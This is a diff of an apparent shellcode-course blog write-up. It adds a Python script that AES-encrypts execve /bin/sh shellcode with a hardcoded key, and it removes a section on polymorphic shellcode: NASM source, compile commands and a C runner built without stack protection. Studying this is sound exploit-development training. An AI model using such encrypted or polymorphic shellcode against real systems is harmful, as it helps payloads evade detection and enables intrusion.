@@ -46,143 +46,56 @@ The AES (Advanced Encryption Standard) cipher  algorithm also known as Rijndael,
 The execve-stack shellcode from the course material will be used as a reference for the shellcode, which spawns a <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell on the local host:
 
 ```bash
-"\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+"\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
 
 A python script will be used as a Crypter wrapper to implement the AES encryption/decryption, referenced from Code Koala [http://www.codekoala.com/posts/aes-encryption-python-using-pycrypto/] [encryption-codekoala].
 
+Note in this instance a static 128-bit key <code class="language-plaintext highlighter-rouge">DisShudBSecretEncryption</code> is hardcoded into the script for the sake of the POC to illustrate the concept, best practice is to randomly generate a key:
+
 ```python
-put here :-)
+#!/usr/bin/python
+
+# Filename: AES_encryption.py
+# Author: h3ll0clar1c3
+# Purpose: Wrapper script to generate encrypted shellcode from the original shellcode
+# Usage: python AES_encryption.py 
+
+from Crypto.Cipher import AES
+import sys
+import os
+import base64
+
+def aes128(shc):
+
+#block size = 16 
+ BLOCK_SIZE = 16 
+ PADDING = '{'
+ pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+ EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+
+#static encryption/decryption key - must be 16/24/32 bytes long
+ secret = 'DisShudBSecretEncryption' 
+ cipher = AES.new(secret)
+ encoded = EncodeAES(cipher, shc)
+ print 'Encrypted shellcode using AES 128-bit key + Base64 encoded:\n\n', encoded
+
+#execve-stack shellcode to spawn /bin/sh shell
+shellcode = """
+\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\x89\\xe1\\xb0\\x0b\\xcd\\x80
+"""
+Encryption = aes128 (shellcode)
 ```
 
-As a POC, the C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 28 bytes:
+As a POC, the AES encryption wrapper script is executed resulting in the original shellcode being encrypted and base-64 encoded:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc execve.c -o execve -z execstack
-execve.c: In function 'main':
-execve.c:36:33: warning: incompatible implicit declaration of built-in function 'strlen' [enabled by default]
-osboxes@osboxes:~/Downloads/SLAE/$ ls
-execve  execve.c
-osboxes@osboxes:~/Downloads/SLAE$ ./execve 
-Lenght: 28
-$ 
+osboxes@osboxes:~/Downloads/SLAE$ python AES_encryption.py 
+Encrypted shellcode using AES 128-bit key + Base64 encoded:
 
+JORa9JYDlDQi0SwuPPwAbqJZydd7ID1G+aUeYRJbEqUygnmo4zi+D0H4o2Dc/FJRJSUNfcu9zM33bg8NcB95qQhhTJ3xKvEiXnY7fLPOt3M6fesL0nrQFrwgUTl8dDr9L2W3vrdYl0Ps9ByF5OwqaQ==
+osboxes@osboxes:~/Downloads/SLAE$ 
 ```
-
-The polymorphic (modified) version of the original shellcode is scripted in Assembly:
-
-```nasm
-; Filename: execve_poly.nasm
-; Author: h3ll0clar1c3
-; Purpose: Spawn a shell on the local host
-; Compilation: ./compile.sh execve_poly
-; Usage: ./execve_poly
-; Shellcode size: 37 bytes
-; Architecture: x86
-
-global   _start
-
-section .text
-        _start:
-
-        xor edx, edx                    ; initialize register // changed the register value
-        push edx                        ; push edx onto the stack // changed the register value
-        mov eax, 0x463ED8B7             ; move 0x463ED8B7 into eax // split to add up to original value /bin/sh
-        add eax, 0x22345678             ; move 0x22345678 into eax // split to add up to original value /bin/sh
-        push eax                        ; push eax onto the stack // added instruction
-        mov eax, 0xDEADC0DE             ; move 0xDEADC0DE into eax // split to add up to original value /bin/sh
-        sub eax, 0x70445EAF             ; move 0x70445EAF into eax // split to add up to original value /bin/sh
-        push eax                        ; push eax onto the stack // added instruction
-        push byte 0xb                   ; push 0xb onto the stack // changed the method
-        pop eax                         ; pop eax off the stack // added instruction
-        mov ecx, edx                    ; move edx into ecx // changed the register value
-        mov ebx, esp                    ; move esp into ebx // changed the order
-        push byte 0x1                   ; push 0x1 onto the stack // added instruction
-        pop esi                         ; pop esi off the stack // added instruction
-        int 0x80                        ; call the interrupt to execute the execve syscall, /bin/sh shell
-```
-
-The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
-#!/bin/bash
-
-echo '[+] Assembling with Nasm ... '
-nasm -f elf32 -o $1.o $1.nasm
-
-echo '[+] Linking ...'
-ld -o $1 $1.o
-
-echo '[+] Done!'
-```
-
-The Assembly code compiled as an executable binary:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh execve_poly
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Done!
-```
-
-The compiled binary is executed:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly 
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ 
-```
-
-Objdump is used to extract the shellcode from the Execve shell in hex format (Null free):
-
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./execve_poly|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
-"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80"
-```
-
-A C program scripted with the newly generated shellcode:
-
-```c 
-/**
-* Filename: execve_poly_shellcode.c
-* Author: h3ll0clar1c3
-* Purpose: Spawn a shell on the local host   
-* Compilation: gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final  
-* Usage: ./execve_poly_final
-* Shellcode size: 37 bytes
-* Architecture: x86
-**/
-
-#include <stdio.h>
-#include <string.h>
-
-unsigned char code[] = \
-"\x31\xd2\x52\xb8\xb7\xd8\x3e\x46\x05\x78\x56\x34\x22\x50\xb8\xde\xc0\xad"
-"\xde\x2d\xaf\x5e\x44\x70\x50\x6a\x0b\x58\x89\xd1\x89\xe3\x6a\x01\x5e\xcd\x80";
-
-int main()
-{
-        printf("Shellcode length: %d bytes\n", strlen(code));
-        int (*ret)() = (int(*)())code;
-        ret();
-}
-```
-
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 37 bytes:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 execve_poly_shellcode.c -o execve_poly_final
-osboxes@osboxes:~/Downloads/SLAE$ ./execve_poly_final 
-Shellcode length: 37 bytes
-$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
-$ 
-```
-
-The polymorphic version of the shellcode is 32% larger in size compared to the original reference from Shell-Storm.
 
 #### 2nd Shellcode (Killall)
 --------------
